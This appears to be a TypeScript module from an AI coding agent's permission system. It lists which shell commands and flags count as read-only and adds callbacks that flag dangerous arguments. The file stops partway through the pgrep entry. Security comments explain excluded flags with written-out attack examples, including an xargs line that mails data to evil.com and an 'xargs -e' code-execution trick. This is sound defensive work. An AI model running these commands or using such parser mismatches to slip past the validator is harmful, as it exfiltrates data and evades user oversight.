import type { z } from 'zod/v4'
import { resolve } from 'path'
import { getFeatureValue_CACHED_MAY_BE_STALE } from 'src/services/analytics/growthbook.js'
import {
  getAdditionalDirectoriesForClaudeMd,
  getOriginalCwd,
} from 'src/bootstrap/state.js'
import {
  extractOutputRedirections,
  splitCommand_DEPRECATED,
} from 'src/utils/bash/commands.js'
import { tryParseShellCommand } from 'src/utils/bash/shellQuote.js'
import { isPathTrusted } from 'src/utils/config.js'
import { getCwd } from 'src/utils/cwd.js'
import { isEnvTruthy } from 'src/utils/envUtils.js'
import { getFsImplementation } from 'src/utils/fsOperations.js'
import {
  findCanonicalGitRoot,
  findGitRoot,
  isCurrentDirectoryBareGitRepo,
} from 'src/utils/git.js'
import type { PermissionResult } from 'src/utils/permissions/PermissionResult.js'
import { getPlatform } from 'src/utils/platform.js'
import { SandboxManager } from 'src/utils/sandbox/sandbox-adapter.js'
import {
  containsVulnerableUncPath,
  DOCKER_READ_ONLY_COMMANDS,
  EXTERNAL_READONLY_COMMANDS,
  type FlagArgType,
  GH_READ_ONLY_COMMANDS,
  GIT_READ_ONLY_COMMANDS,
  RIPGREP_READ_ONLY_COMMANDS,
  validateFlags,
} from 'src/utils/shell/readOnlyCommandValidation.js'
import type { BashTool } from './BashTool.js'
import { isNormalizedGitCommand } from './bashPermissions.js'
import { bashCommandIsSafe_DEPRECATED } from './bashSecurity.js'
import {
  COMMAND_OPERATION_TYPE,
  PATH_EXTRACTORS,
  type PathCommand,
} from './pathValidation.js'
import { sedCommandIsAllowedByAllowlist } from './sedValidation.js'

// Unified command validation configuration system
type CommandConfig = {
  // A Record mapping from the command (e.g. `xargs` or `git diff`) to its safe flags and the values they accept
  safeFlags: Record<string, FlagArgType>
  // An optional regex that is used for additional validation beyond flag parsing
  regex?: RegExp
  // An optional callback for additional custom validation logic. Returns true if the command is dangerous,
  // false if it appears to be safe. Meant to be used in conjunction with the safeFlags-based validation.
  additionalCommandIsDangerousCallback?: (
    rawCommand: string,
    args: string[],
  ) => boolean
  // When false, the tool does NOT respect POSIX `--` end-of-options.
  // validateFlags will continue checking flags after `--` instead of breaking.
  // Default: true (most tools respect `--`).
  respectsDoubleDash?: boolean
}

/**
 * densable `qm` — true when an arg carries command-substitution markers.
 * Used by help/man dangerous callbacks (2.1.214 #6).
 */
function argHasCommandSubstitutionMarkers(arg: string): boolean {
  return (
    arg.includes('$(') ||
    arg.includes('`') ||
    arg.includes('${') ||
    // tracked placeholders from AST substitution (defense in depth)
    arg.includes('__CMDSUB_OUTPUT__') ||
    arg.includes('__TRACKED_VAR__')
  )
}

/**
 * densable man.additionalCommandIsDangerousCallback:
 * - cmdsub in operands → dangerous
 * - apropos mode (-k/-f/--apropos/--whatis) + operand starting with `-` → dangerous
 * - NOT whatis-mode and path-like (`/` `\` `~`) → dangerous
 */
export function manArgsAreDangerous(args: string[]): boolean {
  const aproposWhatisFlags = new Set(['-k', '-f', '--apropos', '--whatis'])
  const sectionFlags = new Set(['-S', '-s'])

  // First pass: detect apropos/whatis mode (including short cluster -kf)
  let aproposMode = false
  for (const a of args) {
    if (a === '--') break
    if (!a.startsWith('-') || a === '-') continue
    if (a.startsWith('--')) {
      if (aproposWhatisFlags.has(a)) aproposMode = true
    } else if (/[kf]/.test(a.slice(1))) {
      aproposMode = true
    }
  }

  let whatisMode = false
  let pastEndOfOptions = false
  for (let i = 0; i < args.length; i++) {
    const a = args[i]!
    if (!pastEndOfOptions && a === '--') {
      pastEndOfOptions = true
      continue
    }
    if (!(pastEndOfOptions || !a.startsWith('-') || a === '-')) {
      if (aproposWhatisFlags.has(a)) {
        whatisMode = true
      } else if (sectionFlags.has(a)) {
        i++ // skip section value
      }
      continue
    }
    pastEndOfOptions = true
    if (argHasCommandSubstitutionMarkers(a)) return true
    if (aproposMode && a.startsWith('-')) return true
    if (
      !whatisMode &&
      (a.includes('/') || a.includes('\\') || a.includes('~'))
    ) {
      return true
    }
  }
  return false
}

/**
 * densable help.additionalCommandIsDangerousCallback:
 * path-like or command-substitution operands are dangerous.
 */
export function helpArgsAreDangerous(args: string[]): boolean {
  return args.some(
    a =>
      a.includes('/') ||
      a.includes('\\') ||
      a.includes('~') ||
      argHasCommandSubstitutionMarkers(a),
  )
}

// Shared safe flags for fd and fdfind (Debian/Ubuntu package name)
// SECURITY: -x/--exec and -X/--exec-batch are deliberately excluded —
// they execute arbitrary commands for each search result.
const FD_SAFE_FLAGS: Record<string, FlagArgType> = {
  '-h': 'none',
  '--help': 'none',
  '-V': 'none',
  '--version': 'none',
  '-H': 'none',
  '--hidden': 'none',
  '-I': 'none',
  '--no-ignore': 'none',
  '--no-ignore-vcs': 'none',
  '--no-ignore-parent': 'none',
  '-s': 'none',
  '--case-sensitive': 'none',
  '-i': 'none',
  '--ignore-case': 'none',
  '-g': 'none',
  '--glob': 'none',
  '--regex': 'none',
  '-F': 'none',
  '--fixed-strings': 'none',
  '-a': 'none',
  '--absolute-path': 'none',
  // SECURITY: -l/--list-details EXCLUDED — internally executes `ls` as subprocess (same
  // pathway as --exec-batch). PATH hijacking risk if malicious `ls` is on PATH.
  '-L': 'none',
  '--follow': 'none',
  '-p': 'none',
  '--full-path': 'none',
  '-0': 'none',
  '--print0': 'none',
  '-d': 'number',
  '--max-depth': 'number',
  '--min-depth': 'number',
  '--exact-depth': 'number',
  '-t': 'string',
  '--type': 'string',
  '-e': 'string',
  '--extension': 'string',
  '-S': 'string',
  '--size': 'string',
  '--changed-within': 'string',
  '--changed-before': 'string',
  '-o': 'string',
  '--owner': 'string',
  '-E': 'string',
  '--exclude': 'string',
  '--ignore-file': 'string',
  '-c': 'string',
  '--color': 'string',
  '-j': 'number',
  '--threads': 'number',
  '--max-buffer-time': 'string',
  '--max-results': 'number',
  '-1': 'none',
  '-q': 'none',
  '--quiet': 'none',
  '--show-errors': 'none',
  '--strip-cwd-prefix': 'none',
  '--one-file-system': 'none',
  '--prune': 'none',
  '--search-path': 'string',
  '--base-directory': 'string',
  '--path-separator': 'string',
  '--batch-size': 'number',
  '--no-require-git': 'none',
  '--hyperlink': 'string',
  '--and': 'string',
  '--format': 'string',
}

// Central configuration for allowlist-based command validation
// All commands and flags here should only allow reading files. They should not
// allow writing to files, executing code, or creating network requests.
const COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
  xargs: {
    safeFlags: {
      '-I': '{}',
      // SECURITY: `-i` and `-e` (lowercase) REMOVED — both use GNU getopt
      // optional-attached-arg semantics (`i::`, `e::`). The arg MUST be
      // attached (`-iX`, `-eX`); space-separated (`-i X`, `-e X`) means the
      // flag takes NO arg and `X` becomes the next positional (target command).
      //
      // `-i` (`i::` — optional replace-str):
      //   echo /usr/sbin/sendm | xargs -it tail a@evil.com
      //   validator: -it bundle (both 'none') OK, tail ∈ SAFE_TARGET → break
      //   GNU: -i replace-str=t, tail → /usr/sbin/sendmail → NETWORK EXFIL
      //
      // `-e` (`e::` — optional eof-str):
      //   cat data | xargs -e EOF echo foo
      //   validator: -e consumes 'EOF' as arg (type 'EOF'), echo ∈ SAFE_TARGET
      //   GNU: -e no attached arg → no eof-str, 'EOF' is the TARGET COMMAND
      //   → executes binary named EOF from PATH → CODE EXEC (malicious repo)
      //
      // Use uppercase `-I {}` (mandatory arg) and `-E EOF` (POSIX, mandatory
      // arg) instead — both validator and xargs agree on argument consumption.
      // `-i`/`-e` are deprecated (GNU: "use -I instead" / "use -E instead").
      '-n': 'number',
      '-P': 'number',
      '-L': 'number',
      '-s': 'number',
      '-E': 'EOF', // POSIX, MANDATORY separate arg — validator & xargs agree
      '-0': 'none',
      '-t': 'none',
      '-r': 'none',
      '-x': 'none',
      '-d': 'char',
    },
  },
  // All git read-only commands from shared validation map
  ...GIT_READ_ONLY_COMMANDS,
  file: {
    safeFlags: {
      // Output format flags
      '--brief': 'none',
      '-b': 'none',
      '--mime': 'none',
      '-i': 'none',
      '--mime-type': 'none',
      '--mime-encoding': 'none',
      '--apple': 'none',
      // Behavior flags
      '--check-encoding': 'none',
      '-c': 'none',
      '--exclude': 'string',
      '--exclude-quiet': 'string',
      '--print0': 'none',
      '-0': 'none',
      // densable 2.1.214 #45: omit -f/--files-from and -m/--magic-file —
      // those require permission (not read-only auto-allow).
      '-F': 'string',
      '--separator': 'string',
      '--help': 'none',
      '--version': 'none',
      '-v': 'none',
      // Following/dereferencing
      '--no-dereference': 'none',
      '-h': 'none',
      '--dereference': 'none',
      '-L': 'none',
      // Other safe options
      '--keep-going': 'none',
      '-k': 'none',
      '--list': 'none',
      '-l': 'none',
      '--no-buffer': 'none',
      '-n': 'none',
      '--preserve-date': 'none',
      '-p': 'none',
      '--raw': 'none',
      '-r': 'none',
      '-s': 'none',
      '--special-files': 'none',
      // Uncompress flag for archives
      '--uncompress': 'none',
      '-z': 'none',
    },
  },
  sed: {
    safeFlags: {
      // Expression flags
      '--expression': 'string',
      '-e': 'string',
      // Output control
      '--quiet': 'none',
      '--silent': 'none',
      '-n': 'none',
      // Extended regex
      '--regexp-extended': 'none',
      '-r': 'none',
      '--posix': 'none',
      '-E': 'none',
      // Line handling
      '--line-length': 'number',
      '-l': 'number',
      '--zero-terminated': 'none',
      '-z': 'none',
      '--separate': 'none',
      '-s': 'none',
      '--unbuffered': 'none',
      '-u': 'none',
      // Debugging/help
      '--debug': 'none',
      '--help': 'none',
      '--version': 'none',
    },
    additionalCommandIsDangerousCallback: (
      rawCommand: string,
      _args: string[],
    ) => !sedCommandIsAllowedByAllowlist(rawCommand),
  },
  sort: {
    safeFlags: {
      // Sorting options
      '--ignore-leading-blanks': 'none',
      '-b': 'none',
      '--dictionary-order': 'none',
      '-d': 'none',
      '--ignore-case': 'none',
      '-f': 'none',
      '--general-numeric-sort': 'none',
      '-g': 'none',
      '--human-numeric-sort': 'none',
      '-h': 'none',
      '--ignore-nonprinting': 'none',
      '-i': 'none',
      '--month-sort': 'none',
      '-M': 'none',
      '--numeric-sort': 'none',
      '-n': 'none',
      '--random-sort': 'none',
      '-R': 'none',
      '--reverse': 'none',
      '-r': 'none',
      '--sort': 'string',
      '--stable': 'none',
      '-s': 'none',
      '--unique': 'none',
      '-u': 'none',
      '--version-sort': 'none',
      '-V': 'none',
      '--zero-terminated': 'none',
      '-z': 'none',
      // Key specifications
      '--key': 'string',
      '-k': 'string',
      '--field-separator': 'string',
      '-t': 'string',
      // Checking
      '--check': 'none',
      '-c': 'none',
      '--check-char-order': 'none',
      '-C': 'none',
      // Merging
      '--merge': 'none',
      '-m': 'none',
      // Buffer size
      '--buffer-size': 'string',
      '-S': 'string',
      // Parallel processing
      '--parallel': 'number',
      // Batch size
      '--batch-size': 'number',
      // Help and version
      '--help': 'none',
      '--version': 'none',
    },
  },
  man: {
    // densable 2.1.214 #6: man safeFlags omit -l (local file) and add
    // additionalCommandIsDangerousCallback for path-like / cmdsub operands.
    additionalCommandIsDangerousCallback: (_raw, args) =>
      manArgsAreDangerous(args),
    safeFlags: {
      // densable man.safeFlags (exact)
      '-a': 'none',
      '--all': 'none',
      '-d': 'none',
      '-f': 'none',
      '--whatis': 'none',
      '-h': 'none',
      '-k': 'none',
      '--apropos': 'none',
      '-w': 'none',
      '-S': 'string',
      '-s': 'string',
    },
  },
  // densable help: only -d is safe; path-like / cmdsub operands are dangerous
  // (oh-my-zsh help→man alias can escalate to man -P).
  help: {
    additionalCommandIsDangerousCallback: (_raw, args) =>
      helpArgsAreDangerous(args),
    safeFlags: {
      '-d': 'none',
    },
  },
  netstat: {
    safeFlags: {
      // Safe display options
      '-a': 'none', // Show all sockets
      '-L': 'none', // Show listen queue sizes
      '-l': 'none', // Print full IPv6 address
      '-n': 'none', // Show network addresses as numbers

      // Safe filtering options
      '-f': 'string', // Address family (inet, inet6, unix, vsock)

      // Safe interface options
      '-g': 'none', // Show multicast group membership
      '-i': 'none', // Show interface state
      '-I': 'string', // Specific interface

      // Safe statistics options
      '-s': 'none', // Show per-protocol statistics

      // Safe routing options
      '-r': 'none', // Show routing tables

      // Safe mbuf options
      '-m': 'none', // Show memory management statistics

      // Safe other options
      '-v': 'none', // Increase verbosity
    },
  },
  ps: {
    safeFlags: {
      // UNIX-style process selection (these are safe)
      '-e': 'none', // Select all processes
      '-A': 'none', // Select all processes (same as -e)
      '-a': 'none', // Select all with tty except session leaders
      '-d': 'none', // Select all except session leaders
      '-N': 'none', // Negate selection
      '--deselect': 'none',

      // UNIX-style output format (safe, doesn't show env)
      '-f': 'none', // Full format
      '-F': 'none', // Extra full format
      '-l': 'none', // Long format
      '-j': 'none', // Jobs format
      '-y': 'none', // Don't show flags

      // Output modifiers (safe ones)
      '-w': 'none', // Wide output
      '-ww': 'none', // Unlimited width
      '--width': 'number',
      '-c': 'none', // Show scheduler info
      '-H': 'none', // Show process hierarchy
      '--forest': 'none',
      '--headers': 'none',
      '--no-headers': 'none',
      '-n': 'string', // Set namelist file
      '--sort': 'string',

      // Thread display
      '-L': 'none', // Show threads
      '-T': 'none', // Show threads
      '-m': 'none', // Show threads after processes

      // Process selection by criteria
      '-C': 'string', // By command name
      '-G': 'string', // By real group ID
      '-g': 'string', // By session or effective group
      '-p': 'string', // By PID
      '--pid': 'string',
      '-q': 'string', // Quick mode by PID
      '--quick-pid': 'string',
      '-s': 'string', // By session ID
      '--sid': 'string',
      '-t': 'string', // By tty
      '--tty': 'string',
      '-U': 'string', // By real user ID
      '-u': 'string', // By effective user ID
      '--user': 'string',

      // Help/version
      '--help': 'none',
      '--info': 'none',
      '-V': 'none',
      '--version': 'none',
    },
    // Block BSD-style 'e' modifier and unsafe dashed '-e' combinations (#148 SEA ps)
    additionalCommandIsDangerousCallback: (
      _rawCommand: string,
      args: string[],
    ) => {
      const isFlag = (a: string) =>
        a.startsWith('-') && a.length > 1 && /^-[a-zA-Z0-9_-]/.test(a)
      const hasBsdE = args.some(a => !isFlag(a) && /[eE]/.test(a))
      const hasDashedE = args.some(a => /^-[a-zA-Z]*e/.test(a))
      const allSafeDashed = args.every(
        a => a === '--forest' || /^-[AacdeFfjlwHLTm]+$/.test(a),
      )
      const threadOrForestFlags = args.flatMap(a =>
        a === '--forest' ? [a] : (a.match(/[HLTm]/g) ?? []),
      )
      return (
        hasBsdE ||
        (hasDashedE && !(allSafeDashed && threadOrForestFlags.length <= 1))
      )
    },
  },
  base64: {
    respectsDoubleDash: false, // macOS base64 does not respect POSIX --
    safeFlags: {
      // Safe decode options
      '-d': 'none', // Decode
      '-D': 'none', // Decode (macOS)
      '--decode': 'none', // Decode

      // Safe formatting options
      '-b': 'number', // Break lines at num (macOS)
      '--break': 'number', // Break lines at num (macOS)
      '-w': 'number', // Wrap lines at COLS (Linux)
      '--wrap': 'number', // Wrap lines at COLS (Linux)

      // Safe input options (read from file, not write)
      '-i': 'string', // Input file (safe for reading)
      '--input': 'string', // Input file (safe for reading)

      // Safe misc options
      '--ignore-garbage': 'none', // Ignore non-alphabet chars when decoding (Linux)
      '-h': 'none', // Help
      '--help': 'none', // Help
      '--version': 'none', // Version
    },
  },
  grep: {
    safeFlags: {
      // Pattern flags
      '-e': 'string', // Pattern
      '--regexp': 'string',
      '-f': 'string', // File with patterns
      '--file': 'string',
      '-F': 'none', // Fixed strings
      '--fixed-strings': 'none',
      '-G': 'none', // Basic regexp (default)
      '--basic-regexp': 'none',
      '-E': 'none', // Extended regexp
      '--extended-regexp': 'none',
      '-P': 'none', // Perl regexp
      '--perl-regexp': 'none',

      // Matching control
      '-i': 'none', // Ignore case
      '--ignore-case': 'none',
      '--no-ignore-case': 'none',
      '-v': 'none', // Invert match
      '--invert-match': 'none',
      '-w': 'none', // Word regexp
      '--word-regexp': 'none',
      '-x': 'none', // Line regexp
      '--line-regexp': 'none',

      // Output control
      '-c': 'none', // Count
      '--count': 'none',
      '--color': 'string',
      '--colour': 'string',
      '-L': 'none', // Files without match
      '--files-without-match': 'none',
      '-l': 'none', // Files with matches
      '--files-with-matches': 'none',
      '-m': 'number', // Max count
      '--max-count': 'number',
      '-o': 'none', // Only matching
      '--only-matching': 'none',
      '-q': 'none', // Quiet
      '--quiet': 'none',
      '--silent': 'none',
      '-s': 'none', // No messages
      '--no-messages': 'none',

      // Output line prefix
      '-b': 'none', // Byte offset
      '--byte-offset': 'none',
      '-H': 'none', // With filename
      '--with-filename': 'none',
      '-h': 'none', // No filename
      '--no-filename': 'none',
      '--label': 'string',
      '-n': 'none', // Line number
      '--line-number': 'none',
      '-T': 'none', // Initial tab
      '--initial-tab': 'none',
      '-u': 'none', // Unix byte offsets
      '--unix-byte-offsets': 'none',
      '-Z': 'none', // Null after filename
      '--null': 'none',
      '-z': 'none', // Null data
      '--null-data': 'none',

      // Context control
      '-A': 'number', // After context
      '--after-context': 'number',
      '-B': 'number', // Before context
      '--before-context': 'number',
      '-C': 'number', // Context
      '--context': 'number',
      '--group-separator': 'string',
      '--no-group-separator': 'none',

      // File and directory selection
      '-a': 'none', // Text (process binary as text)
      '--text': 'none',
      '--binary-files': 'string',
      '-D': 'string', // Devices
      '--devices': 'string',
      '-d': 'string', // Directories
      '--directories': 'string',
      '--exclude': 'string',
      '--exclude-from': 'string',
      '--exclude-dir': 'string',
      '--include': 'string',
      '-r': 'none', // Recursive
      '--recursive': 'none',
      '-R': 'none', // Dereference-recursive
      '--dereference-recursive': 'none',

      // Other options
      '--line-buffered': 'none',
      '-U': 'none', // Binary
      '--binary': 'none',

      // Help and version
      '--help': 'none',
      '-V': 'none',
      '--version': 'none',
    },
  },
  ...RIPGREP_READ_ONLY_COMMANDS,
  // Checksum commands - these only read files and compute/verify hashes
  // All flags are safe as they only affect output format or verification behavior
  sha256sum: {
    safeFlags: {
      // Mode flags
      '-b': 'none', // Binary mode
      '--binary': 'none',
      '-t': 'none', // Text mode
      '--text': 'none',

      // Check/verify flags
      '-c': 'none', // Verify checksums from file
      '--check': 'none',
      '--ignore-missing': 'none', // Ignore missing files during check
      '--quiet': 'none', // Quiet mode during check
      '--status': 'none', // Don't output, exit code shows success
      '--strict': 'none', // Exit non-zero for improperly formatted lines
      '-w': 'none', // Warn about improperly formatted lines
      '--warn': 'none',

      // Output format flags
      '--tag': 'none', // BSD-style output
      '-z': 'none', // End output lines with NUL
      '--zero': 'none',

      // Help and version
      '--help': 'none',
      '--version': 'none',
    },
  },
  sha1sum: {
    safeFlags: {
      // Mode flags
      '-b': 'none', // Binary mode
      '--binary': 'none',
      '-t': 'none', // Text mode
      '--text': 'none',

      // Check/verify flags
      '-c': 'none', // Verify checksums from file
      '--check': 'none',
      '--ignore-missing': 'none', // Ignore missing files during check
      '--quiet': 'none', // Quiet mode during check
      '--status': 'none', // Don't output, exit code shows success
      '--strict': 'none', // Exit non-zero for improperly formatted lines
      '-w': 'none', // Warn about improperly formatted lines
      '--warn': 'none',

      // Output format flags
      '--tag': 'none', // BSD-style output
      '-z': 'none', // End output lines with NUL
      '--zero': 'none',

      // Help and version
      '--help': 'none',
      '--version': 'none',
    },
  },
  md5sum: {
    safeFlags: {
      // Mode flags
      '-b': 'none', // Binary mode
      '--binary': 'none',
      '-t': 'none', // Text mode
      '--text': 'none',

      // Check/verify flags
      '-c': 'none', // Verify checksums from file
      '--check': 'none',
      '--ignore-missing': 'none', // Ignore missing files during check
      '--quiet': 'none', // Quiet mode during check
      '--status': 'none', // Don't output, exit code shows success
      '--strict': 'none', // Exit non-zero for improperly formatted lines
      '-w': 'none', // Warn about improperly formatted lines
      '--warn': 'none',

      // Output format flags
      '--tag': 'none', // BSD-style output
      '-z': 'none', // End output lines with NUL
      '--zero': 'none',

      // Help and version
      '--help': 'none',
      '--version': 'none',
    },
  },
  // tree command - moved from READONLY_COMMAND_REGEXES to allow flags and path arguments
  // -o/--output writes to a file, so it's excluded. All other flags are display/filter options.
  tree: {
    safeFlags: {
      // Listing options
      '-a': 'none', // All files
      '-d': 'none', // Directories only
      '-l': 'none', // Follow symlinks
      '-f': 'none', // Full path prefix
      '-x': 'none', // Stay on current filesystem
      '-L': 'number', // Max depth
      // SECURITY: -R REMOVED. tree -R combined with -H (HTML mode) and -L (depth)
      // WRITES 00Tree.html files to every subdirectory at the depth boundary.
      // From man tree (< 2.1.0): "-R — at each of them execute tree again
      // adding `-o 00Tree.html` as a new option." The comment "Rerun at max
      // depth" was misleading — the "rerun" includes a hardcoded -o file write.
      // `tree -R -H . -L 2 /path` → writes /path/<subdir>/00Tree.html for each
      // subdir at depth 2. FILE WRITE, zero permissions.
      '-P': 'string', // Include pattern
      '-I': 'string', // Exclude pattern
      '--gitignore': 'none',
      '--gitfile': 'string',
      '--ignore-case': 'none',
      '--matchdirs': 'none',
      '--metafirst': 'none',
      '--prune': 'none',
      '--info': 'none',
      '--infofile': 'string',
      '--noreport': 'none',
      '--charset': 'string',
      '--filelimit': 'number',
      // File display options
      '-q': 'none', // Non-printable as ?
      '-N': 'none', // Non-printable as-is
      '-Q': 'none', // Quote filenames
      '-p': 'none', // Protections
      '-u': 'none', // Owner
      '-g': 'none', // Group
      '-s': 'none', // Size bytes
      '-h': 'none', // Human-readable sizes
      '--si': 'none',
      '--du': 'none',
      '-D': 'none', // Last modification time
      '--timefmt': 'string',
      '-F': 'none', // Append indicator
      '--inodes': 'none',
      '--device': 'none',
      // Sorting options
      '-v': 'none', // Version sort
      '-t': 'none', // Sort by mtime
      '-c': 'none', // Sort by ctime
      '-U': 'none', // Unsorted
      '-r': 'none', // Reverse sort
      '--dirsfirst': 'none',
      '--filesfirst': 'none',
      '--sort': 'string',
      // Graphics/output options
      '-i': 'none', // No indentation lines
      '-A': 'none', // ANSI line graphics
      '-S': 'none', // CP437 line graphics
      '-n': 'none', // No color
      '-C': 'none', // Color
      '-X': 'none', // XML output
      '-J': 'none', // JSON output
      '-H': 'string', // HTML output with base HREF
      '--nolinks': 'none',
      '--hintro': 'string',
      '--houtro': 'string',
      '-T': 'string', // HTML title
      '--hyperlink': 'none',
      '--scheme': 'string',
      '--authority': 'string',
      // Input options (read from file, not write)
      '--fromfile': 'none',
      '--fromtabfile': 'none',
      '--fflinks': 'none',
      // Help and version
      '--help': 'none',
      '--version': 'none',
    },
  },
  // date command - moved from READONLY_COMMANDS because -s/--set can set system time
  // Also -f/--file can be used to read dates from file and set time
  // We only allow safe display options
  date: {
    safeFlags: {
      // Display options (safe - don't modify system time)
      '-d': 'string', // --date=STRING - display time described by STRING
      '--date': 'string',
      '-r': 'string', // --reference=FILE - display file's modification time
      '--reference': 'string',
      '-u': 'none', // --utc - use UTC
      '--utc': 'none',
      '--universal': 'none',
      // Output format options
      '-I': 'none', // --iso-8601 (can have optional argument, but none type handles bare flag)
      '--iso-8601': 'string',
      '-R': 'none', // --rfc-email
      '--rfc-email': 'none',
      '--rfc-3339': 'string',
      // Debug/help
      '--debug': 'none',
      '--help': 'none',
      '--version': 'none',
    },
    // Dangerous flags NOT included (blocked by omission):
    // -s / --set - sets system time
    // -f / --file - reads dates from file (can be used to set time in batch)
    // CRITICAL: date positional args in format MMDDhhmm[[CC]YY][.ss] set system time
    // Use callback to verify positional args start with + (format strings like +"%Y-%m-%d")
    additionalCommandIsDangerousCallback: (
      _rawCommand: string,
      args: string[],
    ) => {
      // args are already parsed tokens after "date"
      // Flags that require an argument
      const flagsWithArgs = new Set([
        '-d',
        '--date',
        '-r',
        '--reference',
        '--iso-8601',
        '--rfc-3339',
      ])
      let i = 0
      while (i < args.length) {
        const token = args[i]!
        // Skip flags and their arguments
        if (token.startsWith('--') && token.includes('=')) {
          // Long flag with =value, already consumed
          i++
        } else if (token.startsWith('-')) {
          // Flag - check if it takes an argument
          if (flagsWithArgs.has(token)) {
            i += 2 // Skip flag and its argument
          } else {
            i++ // Just skip the flag
          }
        } else {
          // Positional argument - must start with + for format strings
          // Anything else (like MMDDhhmm) could set system time
          if (!token.startsWith('+')) {
            return true // Dangerous
          }
          i++
        }
      }
      return false // Safe
    },
  },
  // hostname command - moved from READONLY_COMMANDS because positional args set hostname
  // Also -F/--file sets hostname from file, -b/--boot sets default hostname
  // We only allow safe display options and BLOCK any positional arguments
  hostname: {
    safeFlags: {
      // Display options only (safe)
      '-f': 'none', // --fqdn - display FQDN
      '--fqdn': 'none',
      '--long': 'none',
      '-s': 'none', // --short - display short name
      '--short': 'none',
      '-i': 'none', // --ip-address
      '--ip-address': 'none',
      '-I': 'none', // --all-ip-addresses
      '--all-ip-addresses': 'none',
      '-a': 'none', // --alias
      '--alias': 'none',
      '-d': 'none', // --domain
      '--domain': 'none',
      '-A': 'none', // --all-fqdns
      '--all-fqdns': 'none',
      '-v': 'none', // --verbose
      '--verbose': 'none',
      '-h': 'none', // --help
      '--help': 'none',
      '-V': 'none', // --version
      '--version': 'none',
    },
    // CRITICAL: Block any positional arguments - they set the hostname
    // Also block -F/--file, -b/--boot, -y/--yp/--nis (not in safeFlags = blocked)
    // Use regex to ensure no positional args after flags
    regex: /^hostname(?:\s+(?:-[a-zA-Z]|--[a-zA-Z-]+))*\s*$/,
  },
  // Official 2.1.319 #1810: which moved from READONLY_COMMANDS to safeFlags allowlist
  which: {
    safeFlags: {
      '-a': 'none',
      '--all': 'none',
      '-s': 'none',
      '-p': 'none',
      '-w': 'none',
      '--skip-dot': 'none',
      '--skip-tilde': 'none',
      '--show-dot': 'none',
      '--show-tilde': 'none',
      '--skip-alias': 'none',
      '--skip-functions': 'none',
      '-v': 'none',
      '-V': 'none',
      '--version': 'none',
      '--help': 'none',
    },
    additionalCommandIsDangerousCallback: (_cmd, args) => {
      let afterDoubleDash = false
      for (const arg of args) {
        if (/[`$(){}|;&<>!*?[\]~\\'"\n\r]/.test(arg)) return true
        if (afterDoubleDash) continue
        if (arg === '--') {
          afterDoubleDash = true
        } else if (
          arg.startsWith('-') &&
          !/^(?:-[A-Za-z]+|--[a-z-]+)$/.test(arg)
        ) {
          return true
        }
      }
      return false
    },
  },
  // info command - moved from READONLY_COMMANDS because -o/--output writes to files
  // Also --dribble writes keystrokes to file, --init-file loads custom config
  // We only allow safe display/navigation options
  info: {
    safeFlags: {
      // Navigation/display options (safe)
      '-f': 'string', // --file - specify manual file to read
      '--file': 'string',
      '-d': 'string', // --directory - search path
      '--directory': 'string',
      '-n': 'string', // --node - specify node
      '--node': 'string',
      '-a': 'none', // --all
      '--all': 'none',
      '-k': 'string', // --apropos - search
      '--apropos': 'string',
      '-w': 'none', // --where - show location
      '--where': 'none',
      '--location': 'none',
      '--show-options': 'none',
      '--vi-keys': 'none',
      '--subnodes': 'none',
      '-h': 'none',
      '--help': 'none',
      '--usage': 'none',
      '--version': 'none',
    },
    // Dangerous flags NOT included (blocked by omission):
    // -o / --output - writes output to file
    // --dribble - records keystrokes to file
    // --init-file - loads custom config (potential code execution)
    // --restore - replays keystrokes from file
  },

  lsof: {
    safeFlags: {
      '-?': 'none',
      '-h': 'none',
      '-v': 'none',
      '-a': 'none',
      '-b': 'none',
      '-C': 'none',
      '-l': 'none',
      '-n': 'none',
      '-N': 'none',
      '-O': 'none',
      '-P': 'none',
      '-Q': 'none',
      '-R': 'none',
      '-t': 'none',
      '-U': 'none',
      '-V': 'none',
      '-X': 'none',
      '-H': 'none',
      '-E': 'none',
      '-F': 'none',
      '-g': 'none',
      '-i': 'none',
      '-K': 'none',
      '-L': 'none',
      '-o': 'none',
      '-r': 'none',
      '-s': 'none',
      '-S': 'none',
      '-T': 'none',
      '-x': 'none',
      '-A': 'string',
      '-c': 'string',
      '-d': 'string',
      '-e': 'string',
      '-k': 'string',
      '-p': 'string',
      '-u': 'string',
      // OMITTED (writes to disk): -D (device cache file build/update)
    },
    // Official 2.1.323 #2010: block +m (create mount supplement file),
    // -i with hostnames/tilde (triggers DNS lookup), unknown + flags,
    // attached non-alpha short flags, and malformed numeric args after -[LSor].
    additionalCommandIsDangerousCallback: (_rawCommand, args) => {
      const safePlusFlagRe = /^\+(?:[DEMdew]|c\d*|f[cfgGn]*|[Lr]\d*)?$/
      const numericFlagRe = /^[-+][a-zA-Z]*[LSor]$/
      for (let i = 0; i < args.length; i++) {
        const arg = args[i]!
        if (arg === '+m' || arg.startsWith('+m')) return true
        // lsof -i4@hostname / -i@hostname triggers DNS lookup
        if (/^-[a-zA-Z]*i\S*@/.test(arg)) {
          const afterAt = arg.slice(arg.indexOf('@') + 1)
          const colonIdx = afterAt.indexOf(':')
          const host = colonIdx >= 0 ? afterAt.slice(0, colonIdx) : afterAt
          if (/[a-zA-Z]/.test(host)) return true
        }
        if (/^-[a-zA-Z]*i$/.test(arg)) {
          const next = args[i + 1] ?? ''
          if (next.includes('~')) return true
          if (next.includes('@')) {
            const afterAt = next.slice(next.indexOf('@') + 1)
            const colonIdx = afterAt.indexOf(':')
            const host = colonIdx >= 0 ? afterAt.slice(0, colonIdx) : afterAt
            if (/[a-zA-Z]/.test(host)) return true
          }
        }
        if (arg !== '--' && /^-[a-zA-Z]*[^a-zA-Z]/.test(arg)) return true
        if (arg.startsWith('+') && !safePlusFlagRe.test(arg)) return true
        if (/^\d+\D/.test(arg) && numericFlagRe.test(args[i - 1] ?? '')) {
          return true
        }
      }
      return false
    },
  },

  pgrep: {
    safeFlags: {
      '-d': 'string',
      '--delimiter': 'string',
      '-l': 'none',
      '--list-name': 'none',
      '-a': 'none',
      '--list-full': 'none',
      '-v': 'none',
      '--inverse': 'none',
      '-w': 'none',
      '--lightweight': 'none',
      '-c': 'none',
      '--count': 'none',
      '-f': 'none',
      '--full': 'none',
      '-g': 'string',
      '--pgroup': 'string',
      '-G': 'string',
      '--group': 'string',
      '-i': 'none',
      '--ignore-case': 'none',
      '-n': 'none',
      '--newest': 'none',
      '-o': 'none',
      '--oldest': 'none',
      '-O': 'string',
      '--older': 'string',
      '-P': 'string',
      '--parent': 'string',
      '-s': 'string',
      '--session': 'string',
